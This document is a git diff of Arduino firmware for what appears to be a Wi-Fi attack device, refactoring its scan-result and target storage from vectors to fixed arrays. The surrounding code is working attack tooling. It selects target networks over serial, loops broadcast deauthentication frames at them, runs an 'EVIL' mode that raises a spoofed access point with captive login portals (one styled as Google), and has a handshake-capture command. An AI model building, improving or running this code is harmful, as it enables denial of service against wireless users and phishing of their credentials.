@@ -1,4 +1,3 @@
-#include "vector"
 #include "wifi_conf.h"
 #include "wifi_cust_tx.h"
 #include "wifi_handshake_capture.h"
@@ -26,6 +25,10 @@ enum portals{
   Google
 };
 
+// Arduino兼容性常量定义
+#define MAX_SCAN_RESULTS 100
+#define MAX_DEAUTH_TARGETS 20
+#define MAX_TEMP_TARGETS 20
 
 //DNS
 
@@ -42,8 +45,8 @@ enum portals{
 
 
 typedef struct {
-  String ssid;
-  String bssid_str;
+  char ssid[33];        // 802.11标准最大SSID长度32+1
+  char bssid_str[18];   // "XX:XX:XX:XX:XX:XX" + 1
   uint8_t bssid[6];
   short rssi;
   uint8_t channel;
@@ -63,8 +66,13 @@ const char* rick_roll[8] = {
 };
 
 
-std::vector<WiFiScanResult> scan_results;
-std::vector<int> deauth_wifis, wifis_temp;
+// Arduino兼容的固定大小数组
+WiFiScanResult scan_results[MAX_SCAN_RESULTS];
+uint8_t scan_results_count = 0;
+int deauth_wifis[MAX_DEAUTH_TARGETS];
+uint8_t deauth_wifis_count = 0;
+int wifis_temp[MAX_TEMP_TARGETS];
+uint8_t wifis_temp_count = 0;
 //WiFiServer server(80);
 uint8_t deauth_bssid[6];
 uint16_t deauth_reason = 2;
@@ -121,20 +129,34 @@ int status = WL_IDLE_STATUS;
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
   if (scan_result->scan_complete == 0) {
+    // 检查数组容量
+    if (scan_results_count >= MAX_SCAN_RESULTS) {
+      DEBUG_SER_PRINT("Warning: Maximum scan results reached\n");
+      return RTW_SUCCESS;
+    }
+    
     record = &scan_result->ap_details;
     record->SSID.val[record->SSID.len] = 0;
-    WiFiScanResult result;
-    result.ssid = String((const char *)record->SSID.val);
-    if(result.ssid.length()==0)result.ssid = String("<empty>");
-    result.channel = record->channel;
-    result.rssi = record->signal_strength;
+    WiFiScanResult* result = &scan_results[scan_results_count];
     
-    memcpy(&result.bssid, &record->BSSID, 6);
-    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
-    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
-    result.bssid_str = bssid_str;
-    result.security = record->security;
-    scan_results.push_back(result);
+    // 使用固定大小字符数组而不是String
+    strncpy(result->ssid, (const char *)record->SSID.val, sizeof(result->ssid) - 1);
+    result->ssid[sizeof(result->ssid) - 1] = '\0';
+    if(strlen(result->ssid) == 0) {
+      strcpy(result->ssid, "<empty>");
+    }
+    
+    result->channel = record->channel;
+    result->rssi = record->signal_strength;
+    
+    memcpy(&result->bssid, &record->BSSID, 6);
+    snprintf(result->bssid_str, sizeof(result->bssid_str), 
+             "%02X:%02X:%02X:%02X:%02X:%02X", 
+             result->bssid[0], result->bssid[1], result->bssid[2], 
+             result->bssid[3], result->bssid[4], result->bssid[5]);
+    
+    result->security = record->security;
+    scan_results_count++;
   }
   return RTW_SUCCESS;
 }
@@ -311,9 +333,16 @@ void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
 }
 
 int scanNetworks(int miliseconds) {
-  DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
-  scan_results.clear();
-  DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
+  char temp_msg[100];
+  snprintf(temp_msg, sizeof(temp_msg), "Scanning WiFi networks (%d ms)...\n", miliseconds);
+  DEBUG_SER_PRINT(temp_msg);
+  
+  // 清空扫描结果数组
+  scan_results_count = 0;
+  memset(scan_results, 0, sizeof(scan_results));
+  
+  snprintf(temp_msg, sizeof(temp_msg), "wifi get band type:%d\n", wifi_get_band_type());
+  DEBUG_SER_PRINT(temp_msg);
   DEBUG_SER_PRINT("scan results cleared...");
   
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
@@ -375,7 +404,7 @@ void loop() {
     if(readString.substring(0,4)=="SCAN"){
       if(apActive)
         destroyAP();
-      deauth_wifis.clear();
+      deauth_wifis_count = 0;
       DEBUG_SER_PRINT("Stop randomSSID\n");
       randomSSID = false;
       rickroll=false;
@@ -394,25 +423,27 @@ void loop() {
       strcpy(wpa_pass,"");
       if(readString.length()>5 && !apActive){
         unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
-        if(numStation < scan_results.size()){
-          wifis_temp.clear();
+        if(numStation < scan_results_count){
+          wifis_temp_count = 0;
           unsigned int num_st_tmp;
           
-          for(unsigned int i=0; i<deauth_wifis.size(); i++){
+          // 复制除了指定目标外的所有目标到临时数组
+          for(unsigned int i=0; i<deauth_wifis_count; i++){
             num_st_tmp=deauth_wifis[i];
-            if(num_st_tmp != numStation){
-              wifis_temp.push_back(num_st_tmp);
+            if(num_st_tmp != numStation && wifis_temp_count < MAX_TEMP_TARGETS){
+              wifis_temp[wifis_temp_count++] = num_st_tmp;
             }
           }
-          deauth_wifis.clear();
-          for(unsigned int i=0; i<wifis_temp.size(); i++){
-            num_st_tmp=wifis_temp[i];
-            deauth_wifis.push_back(num_st_tmp);
+          
+          // 将临时数组复制回主数组
+          deauth_wifis_count = 0;
+          for(unsigned int i=0; i<wifis_temp_count && deauth_wifis_count < MAX_DEAUTH_TARGETS; i++){
+            deauth_wifis[deauth_wifis_count++] = wifis_temp[i];
           }
         }
       }else{
         destroyAP();
-        deauth_wifis.clear();
+        deauth_wifis_count = 0;
         DEBUG_SER_PRINT("Stop randomSSID\n");
         randomSSID = false;
         rickroll=false;
@@ -517,18 +548,26 @@ void loop() {
       }else{
         numStation = readString.substring(7,readString.length()-1).toInt();
       }
-      if(numStation < (int)scan_results.size()&&numStation >=0){
-        DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
-        deauth_wifis.push_back(numStation);
-        DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
+      if(numStation < (int)scan_results_count && numStation >=0){
+        char temp_msg[100];
+        snprintf(temp_msg, sizeof(temp_msg), "Deauthing %d\n", numStation);
+        DEBUG_SER_PRINT(temp_msg);
+        
+        // 添加到去认证目标数组
+        if(deauth_wifis_count < MAX_DEAUTH_TARGETS) {
+          deauth_wifis[deauth_wifis_count++] = numStation;
+        }
+        
+        snprintf(temp_msg, sizeof(temp_msg), "Deauthing %s\n", scan_results[numStation].ssid);
+        DEBUG_SER_PRINT(temp_msg);
         if(readString.substring(0,4)=="EVIL"){
-          int str_len = scan_results[numStation].ssid.length() + 1; 
+          int str_len = strlen(scan_results[numStation].ssid) + 1; 
 
           // Prepare the character array (the buffer) 
           char char_array[str_len];
 
           // Copy it over 
-          scan_results[numStation].ssid.toCharArray(char_array, str_len);
+          strcpy(char_array, scan_results[numStation].ssid);
           char buffer[4];  // Suficiente para "123\0"
           itoa(scan_results[numStation].channel, buffer, 10);
           if(str_len>1)
@@ -550,11 +589,11 @@ void loop() {
       
     }else if(readString.substring(0,4)=="LIST"){
       
-      for (uint i = 0; i < scan_results.size(); i++) {
-        Serial.print("AP:"+String(i)+"|");
-        Serial.print(scan_results[i].ssid + "|");
-        Serial1.print("AP:"+String(i)+"|");
-        Serial1.print(scan_results[i].ssid + "|");
+      for (uint i = 0; i < scan_results_count; i++) {
+        char temp_msg[200];
+        snprintf(temp_msg, sizeof(temp_msg), "AP:%d|%s|", i, scan_results[i].ssid);
+        Serial.print(temp_msg);
+        Serial1.print(temp_msg);
         for (int j = 0; j < 6; j++) {
           if (j > 0){
              Serial.print(":");
@@ -564,12 +603,11 @@ void loop() {
           Serial1.print(scan_results[i].bssid[j], HEX);
           
         }
-        Serial.print("|" + String(scan_results[i].channel) + "|");
-        Serial.print(String(scan_results[i].security) + "|");
-        Serial.print(String(scan_results[i].rssi) + "\n");
-        Serial1.print("|" + String(scan_results[i].channel) + "|");
-        Serial1.print(String(scan_results[i].security) + "|");
-        Serial1.print(String(scan_results[i].rssi) + "\n");
+        char channel_sec_rssi[50];
+        snprintf(channel_sec_rssi, sizeof(channel_sec_rssi), "|%d|%d|%d\n", 
+                scan_results[i].channel, scan_results[i].security, scan_results[i].rssi);
+        Serial.print(channel_sec_rssi);
+        Serial1.print(channel_sec_rssi);
       }
       
     }else if(readString.substring(0,8)=="HANDSHAKE"){
@@ -782,11 +820,11 @@ void loop() {
     last_memory_check = millis();
   }
   
-  if (deauth_wifis.size() > 0) {
+  if (deauth_wifis_count > 0) {
     memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
     wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
     current_num++;
-    if (current_num >= deauth_wifis.size()) current_num = 0;
+    if (current_num >= deauth_wifis_count) current_num = 0;
     digitalWrite(LED_R, HIGH);
     for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
       wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
@@ -867,7 +905,7 @@ void loop() {
             String path = parseRequest(request);
             Serial.println(request);
             if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
-              if (deauth_wifis.size() != 0)
+              if (deauth_wifis_count != 0)
                 handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
               else
                 handleRequest(client, (enum portals)portal, "router");
